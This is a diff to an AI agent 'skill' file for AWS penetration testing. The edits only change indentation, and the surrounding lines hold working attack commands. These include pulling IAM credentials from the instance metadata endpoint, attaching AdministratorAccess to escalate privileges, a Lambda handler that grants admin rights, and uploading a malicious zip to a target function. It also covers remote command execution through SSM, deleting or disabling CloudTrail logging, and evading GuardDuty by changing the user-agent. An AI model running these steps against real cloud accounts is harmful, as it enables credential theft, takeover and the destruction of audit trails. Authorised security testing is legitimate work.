@@ -2,8 +2,8 @@
 name: AWS Penetration Testing
 description: This skill should be used when the user asks to "pentest AWS", "test AWS security", "enumerate IAM", "exploit cloud infrastructure", "AWS privilege escalation", "S3 bucket testing", "metadata SSRF", "Lambda exploitation", or needs guidance on Amazon Web Services security assessment.
 metadata:
-  author: zebbern
-  version: "1.1"
+ author: zebbern
+ version: "1.1"
 ---
 
 # AWS Penetration Testing
@@ -103,10 +103,10 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
 
 # Response contains:
 {
-  "AccessKeyId": "ASIA...",
-  "SecretAccessKey": "...",
-  "Token": "...",
-  "Expiration": "2019-08-01T05:20:30Z"
+ "AccessKeyId": "ASIA...",
+ "SecretAccessKey": "...",
+ "Token": "...",
+ "Expiration": "2019-08-01T05:20:30Z"
 }
 ```
 
@@ -115,11 +115,11 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
 ```bash
 # Get token first
 TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
-  "http://169.254.169.254/latest/api/token")
+ "http://169.254.169.254/latest/api/token")
 
 # Use token for requests
 curl -H "X-aws-ec2-metadata-token:$TOKEN" \
-  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+ "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 ```
 
 **Fargate Container Credentials:**
@@ -161,15 +161,15 @@ aws iam create-access-key --user-name target_user
 
 ```bash
 aws iam attach-user-policy --user-name my_username \
-  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+ --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 ```
 
 ### Add Inline Admin Policy
 
 ```bash
 aws iam put-user-policy --user-name my_username \
-  --policy-name admin_policy \
-  --policy-document file://admin-policy.json
+ --policy-name admin_policy \
+ --policy-document file://admin-policy.json
 ```
 
 ### Lambda Privilege Escalation
@@ -179,18 +179,18 @@ aws iam put-user-policy --user-name my_username \
 import boto3
 
 def lambda_handler(event, context):
-    client = boto3.client('iam')
-    response = client.attach_user_policy(
-        UserName='my_username',
-        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
-    )
-    return response
+ client = boto3.client('iam')
+ response = client.attach_user_policy(
+ UserName='my_username',
+ PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
+ )
+ return response
 ```
 
 ```bash
 # Update Lambda code
 aws lambda update-function-code --function-name target_function \
-  --zip-file fileb://malicious.zip
+ --zip-file fileb://malicious.zip
 ```
 
 ---
@@ -256,12 +256,12 @@ aws ssm describe-instance-information
 
 # Execute command
 aws ssm send-command --instance-ids "i-0123456789" \
-  --document-name "AWS-RunShellScript" \
-  --parameters commands="whoami"
+ --document-name "AWS-RunShellScript" \
+ --parameters commands="whoami"
 
 # Get command output
 aws ssm list-command-invocations --command-id "CMD-ID" \
-  --details --query "CommandInvocations[].CommandPlugins[].Output"
+ --details --query "CommandInvocations[].CommandPlugins[].Output"
 ```
 
 ---
@@ -321,11 +321,11 @@ aws cloudtrail delete-trail --name trail_name
 
 # Disable global events
 aws cloudtrail update-trail --name trail_name \
-  --no-include-global-service-events
+ --no-include-global-service-events
 
 # Disable specific region
 aws cloudtrail update-trail --name trail_name \
-  --no-include-global-service-events --no-is-multi-region-trail
+ --no-include-global-service-events --no-is-multi-region-trail
 ```
 
 **Note:** Kali/Parrot/Pentoo Linux triggers GuardDuty alerts based on user-agent. Use Pacu which modifies the user-agent.
